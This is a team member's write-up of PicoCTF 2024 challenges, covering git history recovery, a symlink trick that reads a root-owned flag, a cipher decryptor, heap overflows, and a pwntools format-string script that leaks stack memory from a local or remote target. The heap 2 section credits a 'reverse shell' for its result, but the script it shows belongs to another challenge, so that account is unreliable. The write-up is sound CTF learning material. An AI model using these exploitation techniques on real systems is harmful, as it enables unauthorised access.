**<u>Description:</u>**

We took part in the PicoCTF 2024 edition with our team. An amazing, very
first international contest in hacking for us.

After struggling and battling very hard, our team made some quite good
results as we weren’t expecting to reach such a place for our first
participation and for the abandon of two of our mates. We ended up at
the 596th place in the world with 4025 points.

<img src="media/image22.png" style="width:5.29688in;height:2.81561in" />

And among the first 50 teams in the Africa Undergraduate teams.

The competition was Jeopardy mode with essentially categories as General
Skills, Web exploitation, Cryptography, Forensics, Steganography, Binary
exploitation and reverse engineering.

**— General Skills —**

**Challenge 1:** Super SSH

<img src="media/image42.png" style="width:5.11979in;height:3.15625in" />

The purpose of this challenge was to connect via a remote connection to
a server through ssh to find the flag. Pretty easy with the command
syntax known, I must admit.

You enter the command using the given password to authenticate, and then
you get the flag.

<img src="media/image43.png" style="width:6.26772in;height:3.13889in" />

**Challenge 2:** Commitment issues

The following challenges deal with git command line issues and security
issues.

The first is based on a commitment issue.

When you download the zip repository and unzip it you get a .git
repository and so, I did. Once I did that I was first unsettle on what
to look for, so I took a look at the hints to find out that we need to
find the recent commits made.

<img src="media/image35.png" style="width:5.15104in;height:2.75232in" />

I firstly made some searches on the git checkout command to use to find
information about past commits, but I didn't get any useful information
I then try the command git show HEAD in the repository

**Challenge 3:** Time machine

<img src="media/image21.png" style="width:6.26772in;height:3.5in" />

The context of this challenge was also the git environment.

Using the same method? Not exactly, I didn't have to here because just
with the cat git show HEAD, I didn’t get anything useful. But then I
made some research online and found out the .git/logs/HEAD file that
contains all the existing information on the possible git operations
made on a repository. So I inspect the drop-in repository that I got
looking for it with the ls command. It was in there and I have the
permission to read it. And then I got the flag.

. And it contains our flag.

<img src="media/image28.png" style="width:6.26772in;height:0.97222in" />

**Challenge 4 :** Blame Game

Same contest about git environment, to resolve it I still use the git
versioning with the exact command.

<img src="media/image13.png" style="width:6.26772in;height:3.69444in" />

<img src="media/image34.png" style="width:6.26772in;height:1in" />

**Challenge 5 :** Collaborative Development

This challenge is also similar to the other, as for the context. But the
issue here was about the merging of the branches included in the git
repository. I first tried to merge the branches, but for that I needed a
proper HEAD. So, I simply decide to switch between the different
branches to retrieve the content of the flag.py file.

<img src="media/image23.png" style="width:6.26772in;height:3.69444in" />

There are totally 3 branches on the git repository: feature/part-1 o 3.

I firstly look for the id of the all the commits that were sent to the
repository.

<img src="media/image14.png" style="width:6.26772in;height:2.98611in" />

Now let’s go on branch feature/part-1 and the feature/part-2

<img src="media/image40.png" style="width:6.26772in;height:2.86111in" />

**Challenge 6:** Binhexa

<img src="media/image7.png" style="width:5.47396in;height:4.50101in" />

This challenge was based on evaluating your knowledge of binary
operations. When you launch the instance, you will get ssh
authentication information to a remote machine that execute a program
written in python. It’ s a game interface which you will play to get the
flag. The game is all as I said before about binary operations. So make
sure to be prepared. But you can still also used online calculator but
still it won’t be fun anymore. So, ...

<img src="media/image24.png" style="width:6.26772in;height:2.83333in" />

**Challenge 7 :** Binary Search

The challenge here is a little bit shifty. As it is a real game of
guessing. You’ll have to find the mystery number of the program to find
the flag.

I easily guess that randomly guess the number with such a big number of
possibilities was too much. Let me explain.

<img src="media/image12.png" style="width:6.26772in;height:2.73611in" />

So you can see from this that there were 1000 possibles answers. So I
remember an old mathematics topic I once learned in grade 12th about
dichotomy to find the approximate value of a variable in an interval.

<img src="media/image8.png" style="width:6.26772in;height:1.36111in" />

It stated here that approximating the value of a number that is within
an interval reduces the error on the value by half. So I simply apply
that method. Although my first two guesses were a little tricky or
risky, I still guess right because it considerably reduces my interval.
And once I get it, I just have to use the method to get the flag.

**Challenge 8:** Endianness

<img src="media/image27.png" style="width:4.59896in;height:3.87978in" />

This challenge was just a little intuitive on the process to solve it,
but not that difficult. The remote system on which the flag was stored
on contains a program that generate a random string and asks you its
little and big endianness. For me, I just google endianness to know what
it was about and I get the explanation.

**The attribute of a system that indicates whether integers are
represented with the most significant byte stored at the lowest address
(big endian) or at the highest address (little endian)**.

I then use endianness converter to get the demanded endianness, and then
I got the flag.

<img src="media/image18.png" style="width:6.26772in;height:4.30556in" />

**Challenge 9:** dont-you-love-banners

<img src="media/image9.png" style="width:5.10938in;height:4.16728in" />

A very interesting one, A very tricky one I must admit, mainly for the
questions to answer to.

I firstly got the leaked password to answer the first question. The
authentication to the machine was based on the answers to the following
questions.

<img src="media/image36.png" style="width:6.26772in;height:4.76389in" />

Once I login, I try viewing the content, looking for the flag or
instructions to get it. I find a banner and a text file.

The banner file contains the banner of the login program. The text file
tells searching deeper, So I decide to go and look in the root
directory. And I got the flag.txt and a python script. The flag.txt is
not readable (permission denied). The script was more interesting and
useful.

<img src="media/image6.png" style="width:5.18229in;height:4.14966in" />

Do you see the strange file that is open as the banner? It’s our banner
file from the home/player directory. I have seen that I have all the
permissions on the file, intriguing. But until then, I didn’t know what
exactly I could do with it. I then saw the hint asking about symlinks.
Yeah, symlinks are the reference we build to index a file when calling
another file to a command execution on Linux. So if I build a link from
banner to /root/flag.txt I will be able to open it as in the script it
is executed with all the privileges.

So, I first delete the default banner and replace it through the
symbolic link.

<img src="media/image37.png" style="width:6.26772in;height:2.55556in" />

And then I got the flag.

<img src="media/image20.png" style="width:6.26772in;height:1.09722in" />

**— Web Exploitation —**

I wasn’t able to solve so many web challenges this time, Most of them
were solved by my teammate.

**Challenge 1:** Web Decode

<img src="media/image26.png" style="width:4.69271in;height:3.68713in" />

Just follow the hint and inspect the page. And I got an encoded string
in the first HTML tag of the body in the *About page.*

<img src="media/image30.png" style="width:5.06771in;height:1.98654in" />

And I just decode the base64 string with Cyberchef.

<img src="media/image29.png" style="width:6.26772in;height:2.34722in" />

**— Cryptography —**

**Challenge 1:** interencdec

<img src="media/image11.png" style="width:4.49479in;height:3.18817in" />

Decoding cipher text is the basic of all cryptography challenges, and
this is not an exception.

The challenge file contains a cipher text that was likely base64 due to
its ending. So I use cyberchef to decode it and I got another cipher
that I just softly modify to get the next good cipher that I decoded to
get the flag.

<img src="media/image17.png" style="width:6.26772in;height:3.05556in" />

**Challenge 2:** C3

<img src="media/image3.png" style="width:5.40104in;height:4.45003in" />

I got two files, one containing ciphertext and another one was a python
script that was used to encrypt the readable text I guess.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>from</strong> random <strong>import</strong> randint<br />
<strong>import</strong> sys<br />
<br />
<strong>def</strong> <strong>generator</strong>(g, x, p):<br />
<strong>return</strong> pow(g, x) % p<br />
<br />
<br />
<strong>def</strong> <strong>encrypt</strong>(plaintext, key):<br />
cipher = []<br />
<strong>for</strong> char <strong>in</strong> plaintext:<br />
cipher.append(((ord(char) * key*311)))<br />
<strong>return</strong> cipher<br />
<br />
<br />
<strong>def</strong> <strong>is_prime</strong>(p):<br />
v = 0<br />
<strong>for</strong> i <strong>in</strong> range(2, p + 1):<br />
<strong>if</strong> p % i == 0:<br />
v = v + 1<br />
<strong>if</strong> v &gt; 1:<br />
<strong>return</strong> <strong>False</strong><br />
<strong>else</strong>:<br />
<strong>return</strong> <strong>True</strong><br />
<br />
<strong>def</strong> <strong>dynamic_xor_encrypt</strong>(plaintext,
text_key):<br />
cipher_text = ""<br />
key_length = len(text_key)<br />
<strong>for</strong> i, char <strong>in</strong>
enumerate(plaintext[::-1]):<br />
key_char = text_key[i % key_length]<br />
encrypted_char = chr(ord(char) ^ ord(key_char))<br />
cipher_text += encrypted_char<br />
<strong>return</strong> cipher_text<br />
<br />
<br />
<strong>def</strong> <strong>test</strong>(plain_text, text_key):<br />
p = 97<br />
g = 31<br />
<strong>if</strong> <strong>not</strong> is_prime(p)
<strong>and</strong> <strong>not</strong> is_prime(g):<br />
print("Enter prime numbers")<br />
<strong>return</strong><br />
a = randint(p-10, p)<br />
b = randint(g-10, g)<br />
print(f"a = {a}")<br />
print(f"b = {b}")<br />
u = generator(g, a, p)<br />
v = generator(g, b, p)<br />
key = generator(v, a, p)<br />
b_key = generator(u, b, p)<br />
shared_key = <strong>None</strong><br />
<strong>if</strong> key == b_key:<br />
shared_key = key<br />
<strong>else</strong>:<br />
print("Invalid key")<br />
<strong>return</strong><br />
semi_cipher = dynamic_xor_encrypt(plain_text, text_key)<br />
cipher = encrypt(semi_cipher, shared_key)<br />
print(f'cipher is: {cipher}')<br />
<br />
<br />
<strong>if</strong> __name__ == "__main__":<br />
message = sys.argv[1]<br />
test(message, "trudeau")</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

Due to the hierarchical method of encryption used, it was obvious to me
that I will have to write a decryption script. And that’s what I did.

Here is the decryption script:

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>import</strong> sys<br />
cipher = ""<br />
<br />
<br />
<strong>from</strong> fileinput <strong>import</strong> input<br />
<strong>for</strong> line <strong>in</strong> input():<br />
cipher += line<br />
<br />
<br />
lookup1 = "\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"<br />
lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"<br />
<br />
plaintext=""<br />
<br />
prev = 0<br />
<strong>for</strong> char <strong>in</strong> cipher:<br />
index= lookup2.index(char)<br />
word=lookup1[(index+prev)%40]<br />
prev=lookup1.index(word)<br />
plaintext += word<br />
<br />
b = 1 / 1<br />
<br />
<strong>print</strong> (plaintext)</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

The plaintext, to my surprise is another code in python. After reading
it, I thought it was maybe the last part of the decryption to do, but I
don’t know what exact part of the code I had to add to my script.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><p><em>#asciiorder</em><br />
<em>#fortychars</em><br />
<em>#selfinput</em><br />
<em>#pythontwo</em></p>
<p># observe here that there is a fileinput that is given to the
program.<br />
chars = ""<br />
<strong>from</strong> fileinput <strong>import</strong> input<br />
<strong>for</strong> line <strong>in</strong> input():<br />
chars += line<br />
b = 1 / 1<br />
<br />
<strong>for</strong> i <strong>in</strong> range(len(chars)):<br />
<strong>if</strong> i == b * b * b:<br />
<strong>print</strong> chars[i] <em>#prints</em><br />
b += 1 / 1</p></th>
</tr>
</thead>
<tbody>
</tbody>
</table>

For some reason, I fill like I had already completed the file content
reading part in my own script, so I choose to complete my script with
the last part of the code.

And then I was able to obtain a sort of string that I doubt but still it
works.

**— Binary Exploitation —**

This PicoCTF really introduced me to the binary exploitation in its
challenging and amazing aspect. I sure struggle, but It was fun. And I
really want to show you what I learned and how I achieve this, so I will
certainly be writing a whole article specially for the Binary
Exploitation challenge.

**Challenge1:** heap 0

<img src="media/image38.png" style="width:6.26772in;height:3.76389in" />

The heap 0 challenge is base on heap manipulation vulnerability in C
programming. In fact, the heap in C program is very sensitive to buffer
overflow when the memory allocated to a specific variable is being
insufficient to the amount of data it is asked to carry. And once it
happens, you can easily rewrite another space in the memory: That’s
briefly how the heap exploitation work.

For this challenge, the whole thing was to find the exact size of data
you will have to push in the memory to rewrite the buffer from *bico* to
another value.

I first give it a try with a guess and I have seen it rewrite a part of
the buffer and the next thing was just to achieve the good size and it
worked out.

<img src="media/image32.png" style="width:5.14063in;height:3.51817in" />

**Challenge 2:** format-string 1

<img src="media/image19.png" style="width:5.40581in;height:3.52789in" />

The concept was the same at least, I find it out by analyzing the source
code. So, I try sending a big amount of formatted strings to the memory
to create a buffer overflow, and it leaked out the memory like a dump of
it. Here we go. As I told you before, the goal is to rewrite a part of
the memory. But for this challenge the goal wasn’t that easy or at least
simple. You didn’t have to rewrite the buffer but to manipulate
efficiently the memory to leak its content, among which was the flag.

I used a special format to achieve this “**%lx**”. It’s the string that
is used to format and print unsigned long hexadecimal values. The leak
of the memory is still in hexadecimal . Now I have to look deeper there
to find the flag.

So I copy the memory in cyberchef and analyze it with cyberchef and then
with a little manipulation and intuition I was able to retrieve the
flag. You’ll just have to exploit endianness swapping to get the right
order of the flag.

<img src="media/image31.png" style="width:5.60938in;height:2.24561in" />

<img src="media/image25.png" style="width:6.26772in;height:3.15278in" />

*Unreadable content*

Let’s dig with a little trick in this encoding by removing some bytes
front and at the end of the

stack. We will then start getting our content.

<img src="media/image41.png" style="width:5.50521in;height:2.01025in" />

<img src="media/image10.png" style="width:4.4375in;height:1.27083in" />

**Challenge 3:** heap 1

<img src="media/image2.png" style="width:6.26772in;height:3.77778in" />

For this challenge, the whole thing was to find the exact size of data
you will have to push in the memory to rewrite the buffer from *bico* to
*pico.* A little change to the heap 0 challenge.

<img src="media/image33.png" style="width:6.26772in;height:5.125in" />

**Challenge 4:** heap 2

<img src="media/image1.png" style="width:5.26563in;height:4.39968in" />

This was one of the most crazy challenge I had to solve, specially for
my first time dealing with Binary exploitation. After analyzing the
code, I quickly figure out it won’t be so easy to get the flag.

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><em>#include &lt;stdio.h&gt;</em><br />
<em>#include &lt;stdlib.h&gt;</em><br />
<em>#include &lt;string.h&gt;</em><br />
<br />
<em>#define FLAGSIZE_MAX 64</em><br />
<br />
int num_allocs;<br />
char *x;<br />
char *input_data;<br />
<br />
void win() {<br />
// Print flag<br />
char buf[FLAGSIZE_MAX];<br />
FILE *fd = fopen("flag.txt", "r");<br />
fgets(buf, FLAGSIZE_MAX, fd);<br />
printf("%s\n", buf);<br />
fflush(stdout);<br />
<br />
exit(0);<br />
}<br />
<br />
void check_win() { ((void (*)())*(int*)x)(); }<br />
<br />
void print_menu() {<br />
printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print
Flag\n5. "<br />
"Exit\n\nEnter your choice: ");<br />
fflush(stdout);<br />
}<br />
<br />
void init() {<br />
<br />
printf("\nI have a function, I sometimes like to call it, maybe you
should change it\n");<br />
fflush(stdout);<br />
<br />
input_data = malloc(5);<br />
strncpy(input_data, "pico", 5);<br />
x = malloc(5);<br />
strncpy(x, "bico", 5);<br />
}<br />
<br />
void write_buffer() {<br />
printf("Data for buffer: ");<br />
fflush(stdout);<br />
scanf("%s", input_data);<br />
}<br />
<br />
void print_heap() {<br />
printf("[*] Address -&gt; Value \n");<br />
printf("+-------------+-----------+\n");<br />
printf("[*] %p -&gt; %s\n", input_data, input_data);<br />
printf("+-------------+-----------+\n");<br />
printf("[*] %p -&gt; %s\n", x, x);<br />
fflush(stdout);<br />
}<br />
<br />
int main(void) {<br />
<br />
// Setup<br />
init();<br />
<br />
int choice;<br />
<br />
<strong>while</strong> (1) {<br />
print_menu();<br />
<strong>if</strong> (scanf("%d", &amp;choice) != 1) exit(0);<br />
<br />
switch (choice) {<br />
case 1:<br />
// <strong>print</strong> heap<br />
print_heap();<br />
<strong>break</strong>;<br />
case 2:<br />
write_buffer();<br />
<strong>break</strong>;<br />
case 3:<br />
// <strong>print</strong> x<br />
printf("\n\nx = %s\n\n", x);<br />
fflush(stdout);<br />
<strong>break</strong>;<br />
case 4:<br />
// Check <strong>for</strong> win condition<br />
check_win();<br />
<strong>break</strong>;<br />
case 5:<br />
// exit<br />
<strong>return</strong> 0;<br />
default:<br />
printf("Invalid choice\n");<br />
fflush(stdout);<br />
}<br />
}<br />
}</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

So the win function() need to be called before we get the flag. So, I
quickly set my objective finding the address of this function and call
it. But how ?

I then google it. How to call a function using the memory and
bufferoverflow. Why with buffer overflow, just because I know that I can
manipulate the entry that I send to the memory thanks to the weak
control on the user entry in the program, which was using scanf
function.

So I went in gef a binary exploitation tool to analyze the heap and
figure, out what I can do to specify the address of my win function(). I
will skip some details of the process here for a future article, but
here is a little resume.

<img src="media/image16.png" style="width:6.26772in;height:4.41667in" />

The rip is where my entry goes in the memory allocated to the running
program. So what I have to do is to send the address of the win function
in the rip to get it to be executed. I use readelf command to get the
memory addresses of the program. And I sent a lot of data in the x
variable to find the outcoming to see how I can run it. Finally, it was
a little tricky but I had to run a reverse shell sending my payload to
get the flag.

Here is the payload script:

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>import</strong> pwn<br />
<strong>import</strong> argparse<br />
<br />
pwn.context.log_level = "CRITICAL"<br />
<br />
parser=argparse.ArgumentParser()<br />
parser.add_argument("destination", type=str, choices={"local",
"remote"})<br />
parser.add_argument("--target", "-t", type=str, default="",
required=<strong>False</strong>)<br />
parser.add_argument("--port", "-p", type=int, default=0,
required=<strong>False</strong>)<br />
args=parser.parse_args()<br />
<br />
elf=pwn.ELF("./format-string-1")<br />
<br />
<br />
new_eip=pwn.p32(elf.symbols["win"])<br />
<br />
<strong>for</strong> i <strong>in</strong> range(1, 256):<br />
payload =b"".join([<br />
b"%" + str(i).encode("utf-8") + b"$lx",<br />
]<br />
)<br />
<br />
<strong>if</strong> args.destination == "local":<br />
p=elf.process()<br />
<strong>elif</strong> args.destination == "remote":<br />
<strong>if</strong> <strong>not</strong> args.target <strong>or</strong>
<strong>not</strong> args.port:<br />
pwn.warning("Give target and connection port")<br />
exit()<br />
p = pwn.remote(args.target, args.port)<br />
<br />
p.recvuntil(b'')<br />
p.sendline(payload)<br />
answer = p.recvall().decode('latin-1')<br />
print(answer)<br />
<br />
encode=""<br />
encode+="".join( x <strong>for</strong> x <strong>in</strong>
"402118-0-7f4438dcea00-0-11a5880-a347834-7ffd682d13a0-7f4438bbfe60-7f4438de44d0-1-7ffd682d1470-0-0-7b4654436f636970-355f31346d316e34-3478345f33317937-31395f673431665f-7d653464663533-7-7f4438de68d8-2300000007-206e693374307250-a336c797453-9-7f4438df7de9-7f4438bc8098-7f4438de44d0-0-7ffd682d1480-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-0-11a3680-1-7f4438be1d90-0-4011f6-100000000-7ffd682d18f8-0-cbb36f4493fa1e15-7ffd682d18f8-4011f6-403e18-7f4438e20040-3449bf1ebc181e15-353b1e38a9701e15-7f4400000000-0-0-0-0-4f23a51a36a64b00-0-7f4438be1e40-7ffd682d1908-403e18-7f4438e212e0-0-0-401110-7ffd682d18f0-0-0-401135-7ffd682d18e8-1c-1-7ffd682d1ea6-0-7ffd682d1ec1-7ffd682d1ed4-7ffd682d1edc-7ffd682d1ef9-7ffd682d1f04-7ffd682d1f19-7ffd682d1f37-7ffd682d1f4d-7ffd682d1f61-7ffd682d1f72-7ffd682d1fb4-7ffd682d1fc3-7ffd682d1fd0-0-21-7ffd683ec000-33-e30-10-1f8bfbff-6-1000-11-64-3-400040-4-38-5-d-7-7f4438de6000-8-0-9-401110-b-0-c-0-d-0-e-0-17-0-19-7ffd682d1ae9-1a-2-1f-7ffd682d1fdd-f-7ffd682d1af9-1b-1c-1c-20-0-0-".split("-"))<br />
print(encode)<br />
memory = [pwn.p64(int(x,16)) <strong>for</strong> x <strong>in</strong>
"402118-0-7f4438dcea00-0-11a5880-a347834-7ffd682d13a0-7f4438bbfe60-7f4438de44d0-1-7ffd682d1470-0-0-7b4654436f636970-355f31346d316e34-3478345f33317937-31395f673431665f-7d653464663533-7-7f4438de68d8-2300000007-206e693374307250-a336c797453-9-7f4438df7de9-7f4438bc8098-7f4438de44d0-0-7ffd682d1480-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-0-11a3680-1-7f4438be1d90-0-4011f6-100000000-7ffd682d18f8-0-cbb36f4493fa1e15-7ffd682d18f8-4011f6-403e18-7f4438e20040-3449bf1ebc181e15-353b1e38a9701e15-7f4400000000-0-0-0-0-4f23a51a36a64b00-0-7f4438be1e40-7ffd682d1908-403e18-7f4438e212e0-0-0-401110-7ffd682d18f0-0-0-401135-7ffd682d18e8-1c-1-7ffd682d1ea6-0-7ffd682d1ec1-7ffd682d1ed4-7ffd682d1edc-7ffd682d1ef9-7ffd682d1f04-7ffd682d1f19-7ffd682d1f37-7ffd682d1f4d-7ffd682d1f61-7ffd682d1f72-7ffd682d1fb4-7ffd682d1fc3-7ffd682d1fd0-0-21-7ffd683ec000-33-e30-10-1f8bfbff-6-1000-11-64-3-400040-4-38-5-d-7-7f4438de6000-8-0-9-401110-b-0-c-0-d-0-e-0-17-0-19-7ffd682d1ae9-1a-2-1f-7ffd682d1fdd-f-7ffd682d1af9-1b-1c-1c-20-0-0-".split("-")
<strong>if</strong> x]<br />
print(memory)</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src="media/image5.png" style="width:5.78461in;height:3.54268in" />

**— Forensics —**

**Challenge 1:** Scan Surprise

<img src="media/image39.png" style="width:5.09896in;height:4.50606in" />

The zip file given contains an image which is a QR code in which the
flag is embedded.

**Challenge 2:** endianness-v2

<img src="media/image15.png" style="width:3.86979in;height:3.04643in" />

A messy file that is normally meant to be an image.

The context is simple: The file of the challenge contains the flag, but
when you try to open it you get an error. So you have to correct the
errors. I use file and exiftool first to find the original type of the
file looking for extension or any comments in the metadata as well
Anyway finally I found out that it is originally a JPEG image file but
the bytes in it were in a complete disorder. Because even after giving
the right order in the extension, I was still unable to load the image.
So next step, reorder the bytes. The tile of the challenge is explicit
“*endianness”* this was where I found out that the bytes in an image can
be rearranged using endianness swap. I then find out after some analysis
that the bytes have been reversed each time after 4 bytes. So, the
solution was to reorder by block of 4 bytes. I did this with a script.
And then I got the flag that was written on the image.

I used the following script:

<table>
<colgroup>
<col style="width: 100%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>def</strong> <strong>swap_endianness</strong>(image_bytes,
swap_size=4):<br />
new_bytes = bytearray()<br />
<strong>for</strong> i <strong>in</strong> range(0, len(image_bytes),
swap_size):<br />
chunk = image_bytes[i:i+swap_size]<br />
chunk = chunk[::-1]<br />
new_bytes.extend(chunk)<br />
<strong>return</strong> bytes(new_bytes)<br />
<br />
<strong>def</strong> <strong>main</strong>():<br />
"""<br />
Reads image bytes from a file, swaps endianness, and writes the modified
bytes to a new file.<br />
"""<br />
new_image = "./new_image.jpg"<br />
<br />
<strong>with</strong> open("./image.jpg", "rb") <strong>as</strong>
file:<br />
image_bytes = file.read()<br />
<br />
modified_bytes = swap_endianness(image_bytes)<br />
<em># Change swap_size by 4 to get the possible right
endianness</em><br />
<br />
<strong>with</strong> open(new_image, "wb") <strong>as</strong>
image:<br />
image.write(modified_bytes)<br />
<br />
print(f"Image endianness swapped and saved to {new_image}")<br />
<br />
<strong>if</strong> __name__ == "__main__":<br />
main()</th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<img src="media/image4.png" style="width:5in;height:2.8125in" />

I made here a writeup of the challenges I had solved then. My team
solved some other interesting challenges that I will also be sharing
soon. This PicoCTF was very fun.
